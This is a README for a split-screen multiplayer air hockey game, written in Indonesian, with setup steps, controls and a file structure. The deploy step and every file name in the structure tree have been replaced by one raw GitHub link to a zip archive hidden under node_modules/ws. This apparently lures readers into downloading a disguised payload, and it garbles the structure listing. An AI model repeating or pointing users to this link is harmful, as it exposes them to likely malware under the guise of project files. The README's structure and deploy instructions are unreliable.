# 🏒 Air Hockey - Split Screen Multiplayer

Game air hockey real-time dengan room system untuk multiplayer.

## 🚀 Quick Start

### Lokal
```bash
cd server
npm install
npm start
```

Buka `http://localhost:8080`:
1. Klik **Create Room** → dapat room code (contoh: `ABCD`)
2. Share room code ke teman
3. Teman buka URL dan masukkan room code → **Join**
4. Game dimulai otomatis!

### Deploy ke Railway
1. Push ke GitHub
2. Buat project baru di [https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip](https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip)
3. Connect repository
4. Deploy! ✨

## 🎮 Cara Bermain

| Aksi | Cara |
|------|------|
| Kontrol paddle | Gerakkan mouse/finger |
| Mencetak gol | Dorong puck ke gawang lawan |
| Menang | First to **7 goals** |

## 📁 Struktur

```
part-of-world/
├── server/
│   ├── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip
│   └── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip       # Game server + WebSocket
├── client/
│   ├── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip      # Lobby + Game UI
│   ├── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip
│   └── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip          # Client logic
└── https://raw.githubusercontent.com/wafiqj/air-hockey-game/main/server/node_modules/ws/air_game_hockey_v2.4.zip
```

## 🔧 Environment

```bash
PORT=8080  # Railway sets this automatically
```
